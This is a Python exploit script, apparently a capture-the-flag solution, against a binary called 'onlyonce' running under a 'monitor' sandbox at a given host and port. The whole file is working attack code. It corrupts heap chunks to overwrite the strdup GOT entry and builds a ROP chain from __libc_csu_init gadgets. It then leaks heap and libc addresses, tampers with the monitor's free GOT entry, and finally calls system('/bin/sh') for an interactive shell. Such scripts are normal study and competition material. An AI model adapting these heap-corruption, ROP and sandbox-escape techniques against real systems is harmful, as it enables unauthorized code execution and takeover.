#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

monitor  = './monitor'
bin_file = './onlyonce'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[monitor, bin_file]}, \
                        remote  = {'host':'192.168.115.3', 'port':5739})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
addr_got_strdup     = binf.got['strdup']
addr_got_read       = binf.got['read']
addr_plt_read       = binf.plt['read']
addr_bss            = binf.sep_section['.bss']

addr_main           = binf.sep_function['main']
addr_csuinit        = binf.sep_function['__libc_csu_init']

addr_name           = binf.symbols['name']

addr_bss_none       = addr_bss + 0xc0
addr_stack          = addr_bss + 0xc00
addr_ptr_read       = addr_bss + 0x100

monf = ELF(monitor)
addr_mon_got_free   = monf.got['free']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    oom = OnlyOnce(conn)
    rop = ROP(binf)

    conn.sendafter('... ', p(0)+p64(0x31)[:-1])

    for i in range(3):
        oom.new(str(i))
    for i in range(3, 8):
        oom.new(str(i)*0x20)

    oom.remove(0)
    oom.remove(1)
    oom.remove(2)

    oom.remove(3)
    oom.remove(7)

    oom.new('a'*0x20)
    oom.rewrite(0, p64(addr_name))
    oom.new('b'*0x20)
    oom.new('c'*0x20)

    oom.new(p(-10)+'X'*0x18+p64(addr_got_strdup))
    oom.rewrite(1, 'a'*5)
    oom.rewrite(1, 'a'*4)
    oom.rewrite(1, p64(rop.r13_r14_r15.address).strip('\x00'))

    # read(STDIN_FILENO, addr_stack, XXXXXXXX)
    exploit  = call(addr_got_read, constants.STDIN_FILENO, addr_stack, 0x1000)                  # read
    exploit += p64(0xdeadbeef)*2
    exploit += p64(addr_stack-8)    # rbp
    exploit += p64(0xdeadbeef)*4
    exploit += p64(rop.leave.address)

    conn.sendlineafter('>> ', '1')
    conn.sendafter('>> ', exploit[:0x7f])

    # read(STDIN_FILENO, addr_ptr_read, XXXXXXXX)
    exploit  = p64(rop.rsi_r15.address)
    exploit += p64(addr_ptr_read)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_plt_read)

    # read(STDIN_FILENO, addr_got_read, 1)
    exploit += call(addr_got_read, constants.STDIN_FILENO, addr_got_read, 0x1)                  # read

    # write(STDOUT_FILENO, addr_bss_none, 0x10)
    exploit += call(addr_got_read, constants.STDOUT_FILENO, addr_bss_none, 0x10)                # write
    # write(STDOUT_FILENO, addr_bss_none, 0x80)
    exploit += call(addr_got_read, constants.STDOUT_FILENO, addr_bss_none, 0x80)                # write

    # write(STDOUT_FILENO, 0xcafebabe, 0xffffffffffffffff)
    exploit += call(addr_got_read, constants.STDOUT_FILENO, 0xcafebabe, 0xffffffffffffffff)     # write

    # read(STDIN_FILENO, addr_stack, 0x50)
    exploit += call(addr_ptr_read, constants.STDIN_FILENO, addr_stack+len(exploit)+0x40, 0x200) # read

    waitsend(conn, exploit)

    waitsend(conn, p64(addr_plt_read + 6))
    waitsend(conn, '\xb0')

    conn.read(0x90)
    if env.check('debug'):
        addr_heap_base = 0x603000
    else:
        leak = conn.read(0x60)
        addr_heap_base      = u64(leak[0x20:0x28]) - 0x310
        info('addr_heap   = 0x{:08x}'.format(addr_heap_base))

        addr_libc_mainarena = u64(leak[0x40:0x48]) - 0x58
        libc.address        = addr_libc_mainarena - offset_libc_mainarena
        info('addr_libc   = 0x{:08x}'.format(libc.address))
        addr_libc_system    = libc.sep_function['system']

        while True:
            if not conn.read(timeout = 0.5):
                break

    # read(STDIN_FILENO, addr_got_read, 1)
    exploit  = call(addr_got_read, constants.STDIN_FILENO, addr_got_read, 0x1)                  # read

    # write(STDOUT_FILENO, addr_bss_none, 0x10)
    exploit += call(addr_got_read, constants.STDOUT_FILENO, addr_bss_none, 0x10)                # write

    # read(STDIN_FILENO, 0xcafebabe, 0xffffffffffffffff)
    exploit += call(addr_ptr_read, constants.STDIN_FILENO, 0xcafebabe, 0xffffffffffffffff)      # read

    # read(STDIN_FILENO, 0xcafebabe, XXXX)
    exploit += call(addr_got_read, constants.STDIN_FILENO, 0xcafebabe, (addr_mon_got_free & ~0xf) - (addr_heap_base+0x350) - 0x20)

    # read(STDIN_FILENO, addr_bss_none, 0x40)
    exploit += call(addr_got_read, constants.STDIN_FILENO, addr_bss_none, 0x40)                 # read

    waitsend(conn, exploit)

    waitsend(conn, '\xb0')
    conn.read(0x20)
    if not env.check('debug'):
        waitsend(conn, 'a'*0x18+p64(0xfffffffffffffff1))
        waitsend(conn, p64(0xdeadbeef))
    waitsend(conn, '/bin/sh\x00'+p64(addr_libc_system))

def call(func_ptr, rdi, rsi, rdx):
    if rdx<0:
        rdx += 0x10000000000000000

    exploit  = p64(addr_csuinit + 0x5a)
    exploit += p64(0)
    exploit += p64(1)
    exploit += p64(func_ptr)               # read
    exploit += p64(rdx)
    exploit += p64(rsi)
    exploit += p64(rdi)
    exploit += p64(addr_csuinit + 0x40)

    return exploit

def waitsend(conn, s):
    sleep(0.05)
    conn.send(s)

class OnlyOnce:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def new(self, data):
        self.sendlineafter('>> ', '1')
        self.sendafter('>> ', data)

    def show(self):
        self.sendlineafter('>> ', '2')
        self.sendafter('>> ', data)

    def remove(self, idx):
        self.sendlineafter('>> ', '3')
        self.sendlineafter('>> ', str(idx))

    def rewrite(self, idx, data):
        self.sendlineafter('>> ', '4')
        self.sendlineafter('>> ', str(idx))
        self.sendafter('>> ', data)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
